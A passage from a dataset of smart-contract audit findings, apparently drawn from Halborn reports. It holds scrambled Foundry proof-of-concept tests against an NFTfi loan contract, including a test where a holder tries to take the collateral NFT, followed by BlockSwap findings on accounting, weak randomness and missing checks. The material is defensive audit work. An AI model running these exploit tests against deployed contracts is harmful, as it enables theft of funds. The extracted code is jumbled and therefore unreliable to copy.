_000000000000000000 ); 68 69  20 _000000000000000000 , 5 _000000000000000000 , 1 , _expiry ,  _lenderSignature ); 70 71 72 73 74 // LOGS console . log (\"****** STATE 2 *******\") ; console . log (\" TX : ALICE ---> RENEGOTIATE LOAN \") ; console . log (\" \") ; // ALICE WANTS TO RENEGOTIATE vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 5 // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s) = vm . sign (0 xB0BB1 , vm . prank ( alice ); directLoanFixedOfferRedeploy . renegotiateLoan (1 , 30 days , bytes memory v_bytes ; if ( v == 27) { v_bytes = hex \"1 b \";} else { v_bytes = hex \"1 c \";} bytes memory _lenderSignature = bytes . concat (r , s , v_bytes 41 G N I T S E T L A U N A M // 10 DAYS LATER console . log (\" - - - - - - - - - - - - - - - -\") ; console . log (\"10 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - - -\") ; vm . warp (10 days ); getBalances (1) ; 75 76 77 78 79 80 81 82 83 84 85  _000000000000000000 ); 86 87  _000000000000000000 ); 88 89 90 91 92 93 94 95 96 } // ALICE PAY THE MONEY vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 20 vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 20 vm . prank ( alice ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // LOGS console . log (\"****** STATE 3 *******\") ; console . log (\" TX : ALICE ---> PAY BACK LOAN \") ; console . log (\" \") ; getBalances (1) ; G N I T S E T L A U N A M 42 Output G N I T S E T L A U N A M 43 TEST 6: Script Listing 11 // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; 1 function test_6_CannotRenegotiateHisOwnLoan () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13  _000000000000000000 ); 14 15 16 17  getBobbyOfferSignature () ; 18 19 20 21 22  signaturefi , borrowerSettings ); 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT OFFER \") ; console . log (\" \") ; getBalances (1) ; // 1 DAY LATER console . log (\" - - - - - - - - - - - - - - -\") ; console . log (\"1 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - -\") ; vm . warp (1 days ); // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , // MSG HASH PREPARATION G N I T S E T L A U N A M 44 ) ); } uint256 _expiry = block . timestamp + 10; // + 10 seconds id2 := chainid () uint256 id2 ; assembly { // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( abi . encodePacked ( uint32 (1) , uint32 (0) , uint256 (1 _000000000000000000 ) , uint256 (0) , abi . encodePacked ( bobby , uint256 (1) , _expiry ) , address ( directLoanFixedOfferRedeploy ) , id2 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  message ); 58 59 60  signedMessage ); 61 62 63  ); 64 65 66 67 68  _000000000000000000 , 0, 1, _expiry , _lenderSignature ); 69 70 71 72 73 74 75 76 // BOBBY TRIES TO LIQUIDATE THE LOAN vm . prank ( bobby ); vm . expectRevert () ; directLoanFixedOfferRedeploy . liquidateOverdueLoan (1) ; // ALICE WANTS TO RENEGOTIATE vm . prank ( bobby ); vm . expectRevert (\" Only borrower can initiate \") ; directLoanFixedOfferRedeploy . renegotiateLoan (1 , 0 , 1 // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s) = vm . sign (0 xB0BB1 , // LOGS console . log (\"****** STATE 2 *******\") ; bytes memory v_bytes ; if ( v == 27) { v_bytes = hex \"1 b \";} else { v_bytes = hex \"1 c \";} bytes memory _lenderSignature = bytes . concat (r , s , v_bytes 45 G N I T S E T L A U N A M console . log (\" TX : BOBBY ---> TRIES TO RENEGOTIATE HIS OWN 77  LOAN AND REDUCE TIME TO 0 ( revert ) \") ; 78 79 80 81 console . log (\" TX : BOBBY ---> LIQUIDATE LOAN ( revert ) \") ; console . log (\" \") ; getBalances (1) ; } G N I T S E T L A U N A M Output 46 TEST 7: Script Listing 12 // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; 1 function test_7_PromisoryNoteExchange () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13  _000000000000000000 ); 14 15 16 17  getBobbyOfferSignature () ; 18 19 20 21 22  signaturefi , borrowerSettings ); 23 24 25 26 27 28 29 30 31 32 33 34  5929418158485165765) ; // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT OFFER \") ; console . log (\" \") ; getBalances (1) ; // TRNSFER PROMISSORY_NOTE nftObligationReceipt . balanceOf ( address ( alice )) ; nftPromissoryNote . ownerOf (5929418158485165765) ; vm . startPrank ( bobby ); nftPromissoryNote . approve ( address ( carla ) , // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , G N I T S E T L A U N A M 47 nftPromissoryNote . transferFrom ( address ( bobby ) , address ( // 5 DAYS LATER console . log (\" - - - - - - - - - - - - - - -\") ; console . log (\"5 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - -\") ; vm . warp (5 days ); vm . stopPrank () ; 35  carla ) , 5929418158485165765) ; 36 37 38 39 40 41 42 43 44 45 46  _000000000000000000 ); 47 48 49 50 51 52  CARLA \") ; 53 54 55 56 } // ALICE PAY THE MONEY vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12 vm . prank ( alice ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // LOGS console . log (\"****** STATE 2 *******\") ; console . log (\" TX : BOBBY ---> TRANSFER PROMISSORY NOTE TO console . log (\" TX : ALICE ---> PAY BACK LOAN \") ; console . log (\" \") ; getBalances (1) ; G N I T S E T L A U N A M 48 Output G N I T S E T L A U N A M 49 TEST 8: Script Listing 13 vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; 1 function test_8_ObligationReceiptExchange () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13 14  _000000000000000000 ); 15 16 17 18  getBobbyOfferSignature () ; 19 20 21 22 23  signaturefi , borrowerSettings ); 24 25 26 27 28 29 30 31 32 33 34 35 // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT OFFER \") ; console . log (\" \") ; getBalances (1) ; // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , // MINT AND TRNSFER PROMISSORY_NOTE nftObligationReceipt . balanceOf ( address ( alice )) ; vm . startPrank ( alice ); directLoanFixedOfferRedeploy . mintObligationReceipt (1) ; nftObligationReceipt . balanceOf ( address ( alice )) ; G N I T S E T L A U N A M 50 nftObligationReceipt . approve ( address ( carla ) , nftObligationReceipt . transferFrom ( address ( alice ) , address ( vm . stopPrank () ; 36  5929418158485165765) ; 37  carla ) , 5929418158485165765) ; 38 39 40 41 42  _000000000000000000 ); 43 44 45 46 47 48  CARLA \") ; 49 50 51 52 } // ALICE TRY TO STEAL NFT vm . startPrank ( carla ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12 directLoanFixedOfferRedeploy . payBackLoan (1) ; vm . stopPrank () ; // LOGS console . log (\"****** STATE 2 *******\") ; console . log (\" TX : ALICE ---> TRANSFER OBLIGATION RECEIPT TO console . log (\" TX : CARLA ---> PAY BACK LOAN \") ; console . log (\" \") ; getBalances (1) ; G N I T S E T L A U N A M 51 Output G N I T S E T L A U N A M 52 TEST 8.1: Script Listing 14 vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; 1 function test_82_ObligationReceiptExchangeAttack () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13 14  _000000000000000000 ); 15 16 17 18  getBobbyOfferSignature () ; 19 20 21 22 23  signaturefi , borrowerSettings ); 24 25 26 27 28 29 30 31 32 33 34 35 // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT OFFER \") ; console . log (\" \") ; getBalances (1) ; // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , // MINT AND TRNSFER PROMISSORY_NOTE nftObligationReceipt . balanceOf ( address ( alice )) ; vm . startPrank ( alice ); directLoanFixedOfferRedeploy . mintObligationReceipt (1) ; nftObligationReceipt . balanceOf ( address ( alice )) ; G N I T S E T L A U N A M 53 nftObligationReceipt . approve ( address ( carla ) , nftObligationReceipt . transferFrom ( address ( alice ) , address ( 36  5929418158485165765) ; 37  carla ) , 5929418158485165765) ; 38 39 40  _000000000000000000 ); 41 42 43 44 45 46  CARLA \") ; 47 48 49 50 } // ALICE TRY TO STEAL NFT token . approve ( address ( directLoanFixedOfferRedeploy ) , 12 directLoanFixedOfferRedeploy . payBackLoan (1) ; vm . stopPrank () ; // LOGS console . log (\"****** STATE 2 *******\") ; console . log (\" TX : ALICE ---> TRANSFER OBLIGATION RECEIPT TO console . log (\" TX : ALICE ---> PAY BACK LOAN \") ; console . log (\" \") ; getBalances (1) ; G N I T S E T L A U N A M 54 Output G N I T S E T L A U N A M 55 TEST 9: Script Listing 15 function test_9_airdrop () public { // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; 1 function test_9_airdrop () public { 2 3 4 5 6 7 8 9 10 11  address ( admin ) , address ( nftFiHub )); 12  nftFiHub )); 13  address ( airdropReceiverToClone )) ; 14 15 16  ); 17 18  airdropReceiverToClone )) ; 19  airdropReceiverFactory )) ; 20  permittedNFTsAndTypeRegistry )) ; 21  permittedAirdrop )); 22 23 24 25 26 27  )); 28 29 30 31 vm . stopPrank () ; // AIRDROP RECEIVER ( alt 2) vm . startPrank ( admin ); airdropReceiverFactory = new AirdropReceiverFactory ( airdropReceiverToClone = new AirdropReceiver ( address ( permittedNFTsAndTypeRegistry . setNftType ( ' AirdropWrapper ', // SETTING CONTRACTS AND PERMISIONS permittedNftContracts . push ( address ( airdropReceiverToClone ) permittedNftTypes . push ( ' AIRDROP_RECEIVER ') ; nftFiHub . setContract ( ' AIRDROP_RECEIVER ', address ( nftFiHub . setContract ( ' AIRDROP_FACTORY ' , address ( nftFiHub . setContract ( ' PERMITTED_NFTS ' , address ( nftFiHub . setContract ( ' PERMITTED_AIRDROPS ' , address ( vm . stopPrank () ; vm . startPrank ( alice ); uint256 aliceWrapperId ; address aliceAirdropReceiverAddr ; console . logBytes ( bytes ( ContractKeys . AIRDROP_WRAPPER_STRING // ------------------------------------------- // ALICE BORROWS GIVING PUNK AS COLLATERAL 56 G N I T S E T L A U N A M // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // ------------------------------------------- vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 32 33 34 35  directLoanFixedOfferRedeploy )) ; 36 37 38 39  _000000000000000000 ); 40 41 42 43  getBobbyOfferSignature () ; 44 45 46 47 48 49  signaturefi , borrowerSettings ); 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68  (\" mintNFT ( uint256 )\" , 1) ; vm . prank ( alice ); 69 console . log (\"0 xx \", punkContract . punkIndexToAddress (0) ) ; // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , console . log (\"0 yy \", punkContract . punkIndexToAddress (0) ) ; // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT BOBBY ' S OFFER \") ; console . log (\" \") ; getBalances (1) ; // 5 DAYS LATER console . log (\" - - - - - - - - - - - - - - -\") ; console . log (\"5 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - -\") ; console . log (\" \") ; vm . warp (5 days ); vm . prank ( alice ); directLoanFixedOfferRedeploy . wrapCollateral (1) ; // ALICE PULLS THE AIRDROP bytes memory encodedFunctionData = abi . encodeWithSignature 57 G N I T S E T L A U N A M AirdropReceiver ( address (0 directLoanFixedOfferRedeploy . payBackLoan (1) ; AirdropReceiver ( address (0 // THE LOAN IS PAID BY ALICE vm . startPrank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12 70  x6d69556Cf844F68065f814F1E9E00854dDf91A28 )) . pullAirdrop ( address (  nftContract ) , encodedFunctionData ); 71 72 73 74  _000000000000000000 ); 75 76  x6d69556Cf844F68065f814F1E9E00854dDf91A28 )) . unwrap ( alice ); 77  x6d69556Cf844F68065f814F1E9E00854dDf91A28 )) . drainERC721Airdrop (  address ( nftContract ) , 10 , alice ); 78 79 80 81 82 83 84 // LOGS vm . stopPrank () ; console . log (\" ownerOfNFT \", nftContract . ownerOf (10) ) ; console . log (\"0 zz \", punkContract . punkIndexToAddress (0) ) ; console . log (\" alice \", alice ); AirdropReceiver ( address (0 } G N I T S E T L A U N A M 58 Output G N I T S E T L A U N A M 59 ",
        "labels": [
            "Halborn",
            "NFTfi_Native_Punk_Wrapper",
            "Severity: Critical"
        ]
    },
    {
        "title": "MAPPING IS NOT DECREASED AFTER A DEPOSIT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract BalanceReporter, the following function is defined: Listing 1: BalanceReporter.sol (Lines 272) address _stakeHouse , bytes calldata _blsPublicKey , uint256 _amount 252 function _addTopUpToQueue ( 253 254 255 256 ) internal { 257 258 stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] += _amount ; stakeHouseTotalDepositedForMembers [ _stakeHouse ][ _blsPublicKey ] += _amount ; if ( stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] >= 1 ether ) { uint256 depositAmount = stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ]; // Deposit amount sent to the deposit contract must be a multiple of 1 gwei so adjust deposit amount accordingly depositAmount -= depositAmount % 1 gwei ; bytes memory _blsSignature = universe . accountManager () . getSignatureByBLSKey ( _blsPublicKey ); // / Deposit amount is divided by 1 gwei , because Deposit contract only tracks the balance up to 1 gwei precision bytes32 leaf = ETH2Validation . getDepositDataRoot ( _blsPublicKey , _blsSignature , WITHDRAWAL_CREDENTIALS , depositAmount / 1 gwei ); // / Send deposit topup to the contract DepositContract . deposit { value : depositAmount }( _blsPublicKey , WITHDRAWAL_CREDENTIALS , _blsSignature , leaf ); 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 15 274 emit FundsSentToDepositContract ( _stakeHouse , _blsPublicKey , depositAmount ); } emit ETHQueueDeposit ( _stakeHouse , _blsPublicKey , _amount ); 275 276 277 278 } The function _addTopUpToQueue makes use of the following mapping: stakeHouseMemberQueue[_stakeHouse][_blsPublicKey] the amount of Ether that should be sent to the Deposit Contract: calculate to Listing 2: BalanceReporter.sol 24 // / @notice StakeHouse -> Member ID ( Validator pub key ) -> ETH queued to be sent to the deposit contract 25 mapping ( address => mapping ( bytes => uint256 )) public stakeHouseMemberQueue ; As we can see, depositAmount}(_blsPublicKey, WITHDRAWAL_CREDENTIALS, _blsSignature, leaf); the mapping amount is not decreased. This means that: after the call to DepositContract.deposit{value: 1. In the second call to _addTopUpToQueue the function will try to deposit a wrong amount of Ether into the Deposit Contract. 2. The contract will not have enough funds to be sent to the Deposit Contract causing any call to _addTopUpToQueue to revert. Hence, noone will be able to use the functions slashAndBuySlot and buySlashedSlot. Risk Level: Likelihood - 5 Impact - 4 16 Recommendation: stakeHouseMemberQueue should be decreased after the DepositContract. deposit call by exactly the amount sent to the Deposit Contract. Remediation Plan: SOLVED: The BalanceReporter.sol contract now correctly decreases the stakeHouseMemberQueue mapping as suggested: Listing 3: BalanceReporter.sol (Lines 274) address _stakeHouse , bytes calldata _blsPublicKey , uint256 _amount 254 function _addTopUpToQueue ( 255 256 257 258 ) internal { 259 260 stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] += _amount ; stakeHouseTotalDepositedForMembers [ _stakeHouse ][ _blsPublicKey ] 261 262 263 264 265 266 267 268 269 270 271 272 273 274 += _amount ; if ( stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] >= 1 ether ) { uint256 depositAmount = stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ]; // Deposit amount sent to the deposit contract must be a multiple of 1 gwei so adjust deposit amount accordingly depositAmount -= depositAmount % 1 gwei ; bytes memory _blsSignature = universe . accountManager () . getSignatureByBLSKey ( _blsPublicKey ); // / Deposit amount is divided by 1 gwei , because Deposit contract only tracks the balance up to 1 gwei precision bytes32 leaf = ETH2Validation . getDepositDataRoot ( _blsPublicKey , _blsSignature , WITHDRAWAL_CREDENTIALS , depositAmount / 1 gwei ); // Adjust the member queue by the amount of value being sent to the deposit contract stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] -= depositAmount ; 17 275 276 277 278 279 280 281 282 283 } // / Send deposit topup to the contract DepositContract . deposit { value : depositAmount }( _blsPublicKey , WITHDRAWAL_CREDENTIALS , _blsSignature , leaf ); emit FundsSentToDepositContract ( _stakeHouse , _blsPublicKey , depositAmount ); } emit ETHQueueDeposit ( _stakeHouse , _blsPublicKey , _amount ); 18 ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: High"
        ]
    },
    {
        "title": "WEAK PRNG IN SKLOOTFACTORY CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract skLootFactory, the following function is defined: Listing 4: skLootFactory.sol (Lines 265) 253 function skLootItemClaim ( 254 255 256 257 ) external { 258 address _stakeHouse , address _recipient , uint256 _brandTokenId require ( msg . sender == address ( brandCentral ) , \" Only brand central \" ); // Source of entropy uint256 numberOfKnotsInHouse = StakeHouseRegistry ( _stakeHouse ) . numberOfMemberKNOTs () ; uint256 numberOfHouseKnotInUniverse = brandCentral . universe () . numberOfStakeHouses () ; uint256 totalKnotsInUniverse = numberOfKnotsInHouse + numberOfHouseKnotInUniverse ; bool isSpecial = _blockNumber () % 50 == 0; // Generate a pseudo random number using above and blockchain entropy // in theory , miners dont manipulate basefee as that is burnt - EIP1559 uint256 pseudoRandomNumber = uint256 ( keccak256 ( abi . encodePacked ( block . difficulty , block . timestamp , block . basefee , numberOfKnotsInHouse , numberOfHouseKnotInUniverse , isSpecial , totalKnotsInUniverse ))); 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 19 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 } // pluck an item depending on whether its special or knot :) string memory pickedItem ; if ( isSpecial ) { string [6] memory _specialLuckyDipGems = specialLuckyDipGems () ; pickedItem = _specialLuckyDipGems [ pseudoRandomNumber % _specialLuckyDipGems . length ]; } else { string [8] memory _luckyDipItems = luckyDipItems () ; pickedItem = _luckyDipItems [ pseudoRandomNumber % _luckyDipItems . length ]; } // mint the token uint256 tokenId = skLoot . mint ( pickedItem , skLOOT . ItemType . sItem , _brandTokenId , _recipient ); emit skLootItemClaimedForKnot ( tokenId ); This function allows anyone to claim a skLoot item from the open pool when a new member is added to any StakeHouse. The item given is from a lucky dip list where special draws can be made from a rare gem list. As we can see in case that block.number % 50 == 0 the item will be a very rare gem. As it is true that it is not possible to force a transaction in a specific block.number users that are aware of this implementation will definitely try to do the call in a block.number multiple of 50 in order to acquire a gem. Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to increase the complexity of how isSpecial value is calculated and not make it dependant on just the block.number. The best 20 approach would be using Chainlink VRF to generate a random number and based on that number decide if the item given will be special or not. Remediation Plan: SOLVED: The BlockSwap team increased the complexity of how isSpecial value is calculated and it is not dependant only on just the block.number anymore. It is worth mentioning that still this is not totally random as the smart contract does not make use of ChainLink VRF. 21 ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: Low"
        ]
    },
    {
        "title": "LOST ADJUSTED DEPOSIT AMOUNT DIFFERENCE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract BalanceReporter the following function _addTopUpToQueue is defined: Listing 5: BalanceReporter.sol (Lines 264) address _stakeHouse , bytes calldata _blsPublicKey , uint256 _amount 252 function _addTopUpToQueue ( 253 254 255 256 ) internal { 257 258 stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] += _amount ; stakeHouseTotalDepositedForMembers [ _stakeHouse ][ _blsPublicKey ] += _amount ; if ( stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ] >= 1 ether ) { uint256 depositAmount = stakeHouseMemberQueue [ _stakeHouse ][ _blsPublicKey ]; // Deposit amount sent to the deposit contract must be a multiple of 1 gwei so adjust deposit amount accordingly depositAmount -= depositAmount % 1 gwei ; bytes memory _blsSignature = universe . accountManager () . getSignatureByBLSKey ( _blsPublicKey ); // / Deposit amount is divided by 1 gwei , because Deposit contract only tracks the balance up to 1 gwei precision bytes32 leaf = ETH2Validation . getDepositDataRoot ( _blsPublicKey , _blsSignature , WITHDRAWAL_CREDENTIALS , depositAmount / 1 gwei ); // / Send deposit topup to the contract DepositContract . deposit { value : depositAmount }( _blsPublicKey , WITHDRAWAL_CREDENTIALS , _blsSignature , leaf ); 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 22 274 emit FundsSentToDepositContract ( _stakeHouse , _blsPublicKey , depositAmount ); } emit ETHQueueDeposit ( _stakeHouse , _blsPublicKey , _amount ); 275 276 277 278 } As we can see in the comments, the deposit amount sent to the Deposit Contract must be a multiple of 1 GWEI so the deposit amount is adjusted accordingly. Although, in this case, the difference from the msg.value sent by the user and the amount sent to the Deposit Contract will remain in the BalanceReporter/TransactionManager contract and will be lost by the user. Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to send the remaining amount back to the user or directly not allowing the user to use a msg.value that is not multiple of 1 GWEI. Remediation Plan: SOLVED: The BlockSwap team added a require statement that checks now that the amount sent by the user is multiple of 1 GWEI. 23 ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: Low"
        ]
    },
    {
        "title": "FUNCTION NOT EXPOSED IN TRANSACTIONMANAGER CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract AccountManager the following function is defined: Listing 6: AccountManager.sol (Lines 203) address _rageQuitter , bytes calldata _blsPublicKey , address _stakeHouse , uint256 _amountOfETHInDepositQueue , ETH2Validation . ETH2DataReport calldata _report 197 function rageQuitKnot ( 198 199 200 201 202 203 ) external override onlyModule { 204 205 // / Perform the critical checks before exiting the stakehouse _performStakeHousePreFlightChecks ( _rageQuitter , _blsPublicKey ) ; // / Set user lifecycle status to exited _setLifecycleStatus ( _blsPublicKey , uint256 ( LifecycleStatus . EXITED )); blsPublicKeyToLastState [ _blsPublicKey ] = _report ; // / Initialize the rage quit of the Knot universe . rageQuitKnot ( _stakeHouse , _blsPublicKey , _rageQuitter , _amountOfETHInDepositQueue ); 206 207 208 209 210 211 212 213 214 215 216 217 218 219 } The function contains the onlyModule modifier, which means that it can only be called by some other module although the call is not implemented anywhere: 24 This does not occur with other functions in the AccountManager manager contract, as can be seen below: Hence, TransactionManager contract as it is done with the other functions. rageQuitKnot function exposed should the be in the Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to expose the function AccountManager.rageQuitKnot in the TransactionManager contract as it is done with the rest of the functions of AccountManager. Remediation Plan: SOLVED: TransactionManager contract: BlockSwap team The implemented the function in the Listing 7: TransactionManager.sol (Lines 134) 124 function rageQuit ( 125 126 127 128 bytes calldata _blsPublicKey , address _stakehouse , ETH2Validation . ETH2DataReport calldata _eth2Report , ETH2Validation . ETH2DataReportSignature calldata _reportSignature 129 ) external override onlyValidStakeHouse ( _stakehouse ) { 25 130 131 132 133 134 135 136 137 138 require ( _isReportSignatureValid ( _blsPublicKey , _eth2Report , _reportSignature ) , ' Report signature invalid '); _performETH2DataCheckRageQuit ( _blsPublicKey , _eth2Report ); accountManager . rageQuitKnot ( msg . sender , _blsPublicKey , _stakehouse , 0, // As the KNOT was never active , there will be no funds in queue for top up if it is exiting _eth2Report 139 140 141 } ); 26 ",
        "labels": [
            "Halborn",
            "BlockSwap",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BlockSwap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Checking addresses against zero-address during initialization is a security best-practice. However, such checks are missing in multiple constructors. Allowing zero-addresses can lead to contract reverts and force redeployment if there are no setters for such address variables. Code Location: savETHManager.sol Listing 8: savETHManager.sol 14 function init ( StakeHouseUniverse _universe ) external initializer { 15 16 } universe = _universe ; savETHReservePool.sol Listing 9: savETHReservePool.sol 54 function init ( StakeHouseUniverse _universe , address _saveETHLogic ) external initializer { dETHToken = new dETH ( address ( this )) ; StakeHouseUpgradeableProxy saveETHProxy = new StakeHouseUpgradeableProxy ( _saveETHLogic , address ( _universe ) , abi . encodeWithSelector ( savETH ( _saveETHLogic ). init . selector , address ( this ) ) ); saveETHToken = savETH ( address ( saveETHProxy )); 55 56 57 58 59 60 61 62 63 64 65 66 27 67 68 69 } __initModuleGuards ( _universe ); sETH.sol Listing 10: sETH.sol 21 function init ( SlotSettlementPool _slotSettlementPool , address _stakeHouse ) external initializer { slotSettlementPool = _slotSettlementPool ; stakeHouse = _stakeHouse ; __ERC20_init ( \" sETH \" , \" sETH \" ); __ERC20Permit_init ( \" sETH \" ); 22 23 24 25 26 27 28 29 30 31 } SlotSettlementPool.sol Listing 11: SlotSettlementPool.sol __initModuleGuards ( _universe ); StakeHouseUniverse _universe , address _sETHBeacon 50 function init ( 51 52 53 ) external initializer { 54 55 56 57 58 59 } sETHBeacon = _sETHBeacon ; slot = new SlotToken ( address ( this )) ; 28 SlotToken.sol Listing 12: SlotToken.sol 13 constructor ( address _slotSettlementPool ) { 14 15 } slotSettlementPool = _slotSettlementPool ; BrandCentral.sol Listing 13: BrandCentral.sol StakeHouseUniverse _universe , BrandNFT _brandNFT , skLOOTFactory _skLootFactory , BrandCentralClaimAuction _claimAuction 54 function init ( 55 56 57 58 59 ) external initializer { 60 61 62 63 64 65 } __initModuleGuards ( _universe ); brandNFT = _brandNFT ; skLootFactory = _skLootFactory ; claimAuction = _claimAuction ; BrandCentralClaimAuction.sol Listing 14: BrandCentralClaimAuction.sol 13 constructor ( uint256 _startBlock , IERC20 _shbToken ) { 14 15 16 17 18 19 20 21 22 23 24 25 26 isRestrictedBrandTicker [ \" bsn \"] = true ; isRestrictedBrandTicker [ \" cbsn \" ] = true ; isRestrictedBrandTicker [ \" dart \" ] = true ; isRestrictedBrandTicker [ \" saver \" ] = true ; isRestrictedBrandTicker [ \" stake \" ] = true ; isRestrictedBrandTicker [ \" house \" ] = true ; isRestrictedBrandTicker [ \" poly \" ] = true ; isRestrictedBrandTicker [ \" wolf \" ] = true ; isRestrictedBrandTicker [ \" elevt \" ] = true ; isRestrictedBrandTicker [ \" mynt \" ] = true ; isRestrictedBrandTicker [ \" club \" ] = true ; isRestrictedBrandTicker [ \" impfi \" ] = true ; isRestrictedBrandTicker [ \" colab \" ] = true ; 29 isRestrictedBrandTicker [ \" cland \" ] = true ; startBlock = _startBlock ; // auto calculate end block endBlock = startBlock + TOTAL_AUCTION_LENGTH_IN_BLOCKS ; shbToken = _shbToken ; emit Deployed () ; 27 28 29 30 